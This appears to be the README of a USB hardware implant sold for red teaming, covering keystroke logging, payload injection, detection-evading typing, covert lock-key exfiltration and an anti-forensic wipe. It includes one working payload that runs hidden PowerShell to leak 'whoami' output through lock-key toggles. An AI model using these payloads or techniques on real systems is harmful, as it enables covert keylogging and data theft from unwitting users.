# Diabolic Parasite 

## just like what happened with the [Diabolic Drive](https://www.crowdsupply.com/unit-72784/diabolic-drive) this repo will heavily be updated very soon and many features will be added to the firmware. Feel free to contact me with anything related to your Diabolic Parasite at Discord `@3amoonee`
# ⚠️[Full documentation for the Diabolic Shell is available here.](https://github.com/unit72784/Diabolic-Parasite/blob/main/Diabolic-Shell-Documentation.md)⚠️
# [Firmware Update and Installation Instructions are here.](https://github.com/unit72784/Diabolic-Parasite/blob/main/Firmware%20Update%20and%20Installation%20Instructions.md)
<h1>:bangbang: Diabolic Parasite default access point credentials are:
  <br>Wi-Fi SSID: Diabolic Parasite</br>
  Password: diabolic_parasite 
  :bangbang:
</h1>


* [About](#about)
* [Getting Started With Your Diabolic Parasite](#getting-started-with-your-diabolic-parasite)
* [Explore the Diabolic Parasite’s Advanced Tweaks & Stealthy Features](#explore-the-diabolic-parasites-advanced-tweaks--stealthy-features)
  * [Tweaks](#tweaks)
  * [Special Features](#special-features)
* [Using Your Diabolic Parasite as a Diabolic Plug](#using-your-diabolic-parasite-as-a-diabolic-plug)
* [Self-Destruct Mode](#self-destruct-mode)
* [Programming Options](#programming-options)


<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/1b836990-f282-49b1-a445-4da1f05150ba" />



## About
Diabolic Parasite is a next-generation hardware implant designed for stealth, precision, and real-world impact. Built with red teamers, pentesters, and security researchers in mind, it delivers powerful offensive capabilities in an ultra-compact form factor. Whether you’re simulating insider threats or testing physical access scenarios, the Parasite integrates seamlessly into target systems — silently capturing, emulating, and injecting like a true covert operator. It’s not just a tool — it’s a hands-on platform for exploring advanced attack techniques while staying completely under the radar.

## Getting Started With Your Diabolic Parasite

To begin using your Diabolic Parasite, follow these steps:

### **1. Identify the Target HID Device**

Decide which USB HID device you want to connect to the Parasite.
Diabolic Parasite supports **both keyboards and mice**:

* **If you connect a mouse:**

  * The Parasite automatically clones the mouse’s full hardware identity (VID, PID, Manufacturer, Product).
  * All mouse movements and clicks are forwarded in real time.

* **If you connect a keyboard:**

  * The built-in **hardware keylogger** activates automatically.
  * The Parasite clones the keyboard’s full hardware identity.
  * All keystrokes are logged and forwarded silently to the host.

### **2. Insert the Target Device Into the Parasite**

Unplug your desired HID device from the computer, then:

1. Plug the HID device into the **female USB port** on the Diabolic Parasite.
2. Plug the Parasite itself into the **same USB port** where the device was originally connected.

This preserves trust and ensures the host believes it is the same, original device.

### **3. Stealth Registration (Fast Startup Mode)**

If **Fast Startup** is enabled from the Parasite’s settings page:

* The device registers itself on the host **within 5 seconds**.
* It identifies exactly as the original keyboard or mouse.
* No “Installing new hardware” pop-ups appear.
* No security prompts are triggered.

This ensures maximum stealth and seamless integration.

### **4. Connect to the Parasite Wirelessly**

Once connected:

* Join the **Diabolic Parasite Wi-Fi access point**.
* Open the Web UI in your browser.
* From here, you can:

  * View live keylogs
  * Run payloads
  * Edit scripts
  * Change USB identities
  * Enable features such as Jiggler, Exfiltration, Random Cadence, etc.

You are now fully in control of your Diabolic Parasite. Enjoy exploring its capabilities.



<img width="2048" height="1536" alt="image" src="https://github.com/user-attachments/assets/de5ad3d7-9c45-4369-b141-3c728eb83f39" />



## Explore the Diabolic Parasite’s Advanced Tweaks & Stealthy Features

Diabolic Parasite includes a wide range of intelligent tweaks designed to make it a truly covert and virtually undetectable device. Below are some of the specialized behaviors that enhance its stealth, reliability, and precision.

## Tweaks

##  **Keylogger Tweaks**

#### **1. Smart Num Lock Awareness**

The keylogger automatically detects the state of **Num Lock**:

* **Num Lock ON:**
  Numpad keys are logged as numbers (e.g., `NUM7` → `7`).

* **Num Lock OFF:**
  Numpad keys are logged as their alternate functions
  (e.g., `NUM7` → `HOME`, `NUM1` → `END`, etc.).

This ensures accurate and context-aware logging that reflects exactly what the user intended.

#### **2. Intelligent Caps Lock Handling**

The keylogger also detects **Caps Lock** status:

* **Caps Lock ON:** letters are logged as **uppercase**
* **Caps Lock OFF:** letters are logged as **lowercase**

This provides highly accurate keystroke logs that match the user’s real typing behavior.



##  **Keystroke Injection Tweaks**

#### **1. Automatic Case Correction for Payload Accuracy**

During payload injection, the Parasite intelligently senses the **current Caps Lock state** on the host.

If your payload contains case-sensitive text (uppercase or lowercase), the Parasite automatically adjusts how each letter is typed so that:

* The injected output **always matches your payload exactly**
* The injected casing is **100% accurate**, even if Caps Lock is ON or OFF

This ensures flawless and reliable payload delivery every time.



##  **Wi-Fi Tweaks & Intelligent AP Initialization**

Before the Diabolic Parasite initializes its Wi-Fi access point, it:

1. Scans nearby wireless networks
2. Detects the **least crowded Wi-Fi channel**
3. Automatically selects that channel for its AP

This results in:

* Less interference
* Stronger wireless performance
* More stable control during field operations

## Special Features

## Covert Keystroke Reflection

Diabolic Parasite takes keystroke reflection to the next level — transforming a once noisy, detectable method into a truly silent exfiltration channel. Unlike traditional techniques that rely on blinking LEDs or visible activity, the Parasite sits between the host and a real keyboard, intercepting and relaying communication without disruption. It covertly listens for encoded data sent by the host as simulated keystrokes — decoding it silently, without triggering LED indicators or system alerts. Because it perfectly mimics the original HID device, every interaction appears legitimate, allowing data to be exfiltrated in plain sight. It’s not just stealthy — it’s virtually invisible. You can learn more about it and see it in action here:
https://www.crowdsupply.com/unit-72784/diabolic-parasite/updates/next-level-keystroke-reflection

###  Example: Covert Keystroke Reflection Payload 

``` 
GUI r
DELAY 500
EXFIL
STRING powershell -w h "$o='';[char[]]((whoami).Trim())|%{[byte]$_}|%{for($i=7;$i-ge0;$i--){$o+=@('%{CAPSLOCK}','%{NUMLOCK}')[(($_-shr$i)-band1)]}};$o+='%{SCROLLLOCK}';Add-Type -A System.Windows.Forms;[Windows.Forms.SendKeys]::SendWait($o)"
ENTER
```

**If anything goes wrong with your keystroke-reflection exfiltration, you can run `EXFIL KILL` in the payload editor, or simply press the Scroll Lock key on your keyboard. This will signal that the exfiltration was stopped manually and will prevent the Parasite from continuing to listen to and decode lock-key toggle bits.**

## Random Cadence

Human-like keystroke timing helps avoid behavioral detection systems. Using the `RANDOMCADENCE` command, the Diabolic Parasite adds a **random delay** between each typed character to mimic natural human typing.

### How Random Cadence Works

* **`RANDOMCADENCE` (alone)**
  → Enables Random Cadence with the **default delay of 100 ms**
  (each character receives a random delay between **1–100 ms**).

* **`RANDOMCADENCE <number>`**
  → Enables Random Cadence with a **custom upper limit**.
  Example: `RANDOMCADENCE 300` = random delay **1–300 ms** per character.

* **`RANDOMCADENCE OFF`**
  → Disables Random Cadence completely.
  Characters are typed at **maximum speed**.

This gives you full control over how human or machine-like your payload appears.


### Example: Random Cadence Payload 

```
REM === Normal Fast Typing (Random Cadence OFF) ===
GUI r
DELAY 1000
STRING notepad
DELAY 500
ENTER
DELAY 2000
STRING This is normal typing speed from the Diabolic Parasite
ENTER
DELAY 1500

REM === Random Cadence ON (Default: 100 ms) ===
RANDOMCADENCE
STRING This text is typed using the DEFAULT Random Cadence (1-100 ms per character)
ENTER
DELAY 1500

REM === Random Cadence ON (Custom: 300 ms) ===
RANDOMCADENCE 300
STRING This text is typed using Random Cadence set to 300 ms for maximum stealth
ENTER
DELAY 1500

REM === Random Cadence OFF (Return to Fast Typing) ===
RANDOMCADENCE OFF
STRING Random Cadence is now OFF — typing speed is back to full speed
ENTER

```

## LangIgnore Mode

Different keyboard layout? No problem.
The Diabolic Parasite can deliver payloads **consistently across all keyboard layouts** by using **ALT + Numpad ASCII codes**, bypassing language and regional settings entirely when `LANGIGNORE` mode is enabled.

This ensures your payloads are always typed exactly as intended — even on systems using non-English layouts such as Arabic, French, German, Russian, Spanish, etc.

> ⚠️ **Note:** LangIgnore mode works only on **Windows**, because ALT+Numpad character entry is a Windows-specific feature.

Supported commands:

* `LANGIGNORE ON`
  Enables ALT+Numpad layout-independent typing.

* `LANGIGNORE OFF`
  Returns to normal typing behavior using the active locale.

Choose **any non-English keyboard layout**, then run the following payload to see the difference.


### Example: LangIgnore Demonstration Payload

```
REM === Normal Typing (Affected by Keyboard Layout) ===
GUI r
DELAY 800
LANGIGNORE ON
STRING notepad
DELAY 500
ENTER
LANGIGNORE OFF
DELAY 2000
STRING Normal typing depends on your current keyboard layout
ENTER
DELAY 1500
LANGIGNORE ON
REM === LangIgnore ON (ALT + Numpad Layout-Independent Typing) ===
STRING This line is typed with LANGIGNORE ON using ALT+Numpad injection
ENTER
STRING Characters will appear correctly even on non-English layouts
ENTER
DELAY 1500

REM === LangIgnore OFF (Return to Normal Typing) ===
LANGIGNORE OFF
STRING LangIgnore is now OFF — typing behavior returns to normal
ENTER
```



**For additional features—such as Jiggler and USBID—please refer to the **Help** button in the Diabolic Parasite’s navigation menu.**


## Using Your Diabolic Parasite as a Diabolic Plug

The Diabolic Parasite can operate completely on its own—without any keyboard or mouse connected to its female USB port. When plugged directly into a computer, it stays **fully dormant and invisible**, appearing to the system as if nothing at all is connected.

When you activate a payload:

* The Parasite instantly **enumerates as a keyboard** using its preconfigured, stealth-optimized hardware IDs.
* It performs an automatic **readiness check**, ensuring the host is prepared to receive keystrokes.
* Every keystroke is injected with **perfect accuracy**, without timing issues or missed characters.
* No Windows pop-ups such as **“Installing new keyboard”** will appear, maintaining full operational stealth.

To guarantee this mode works flawlessly, run the command:

```
USBID DEFAULT
```

Run it **once** on a test machine via the payload editor, and verify in the log window that the IDs were restored successfully. After that, you can safely save and deploy your payload for the target machine.

This mode turns the Parasite into a truly **plug-and-play covert injector**, ready to strike at the perfect moment.

## Self-Destruct Mode


**Self-Destruct (Panic Wipe) Mode**

Diabolic Parasite includes a built-in *self-destruct* mechanism designed to permanently wipe your payloads and logs if things go sideways.

When self-destruct is triggered, the device:

1. **Performs a *secure* wipe of the storage partition**
   Instead of calling the filesystem’s normal `format()` (which only resets filesystem metadata and can leave old data recoverable with raw flash forensics), the Parasite:

   * Unmounts LittleFS
   * Locates the data partition that holds scripts/logs
   * Erases the **entire partition at flash level** (sector by sector)
   * Recreates a fresh, empty filesystem on top of the erased region

   This destroys all stored Duckyscripts, logs, and other user data in that partition, making recovery from a simple flash dump or off-the-shelf forensic tools extremely unlikely.

2. **Falls back to safe passthrough mode**
   After wiping, the device switches to a minimal “dumb passthrough” behavior:

   * The attached keyboard behaves like a normal keyboard.
   * No further logging, injection, or scripting features are available.
   * The ESP32 enters light-sleep and only wakes to maintain basic passthrough, leaving as little footprint as possible.

> ⚠️ **Note:** This is a best-effort software wipe at the flash-partition level. It is designed to defeat typical forensic techniques (e.g., dumping the SPI flash and carving files), but it cannot guarantee protection against extremely high-end, invasive chip-level analysis.

**To recover from Self-Destruct Mode, please refer to the [detailed instructions provided here](https://github.com/unit72784/Diabolic-Parasite/blob/main/Firmware%20Update%20and%20Installation%20Instructions.md).**

## Programming Options
## [Firmware Update and Installation Instructions are here.](https://github.com/unit72784/Diabolic-Parasite/blob/main/Firmware%20Update%20and%20Installation%20Instructions.md)
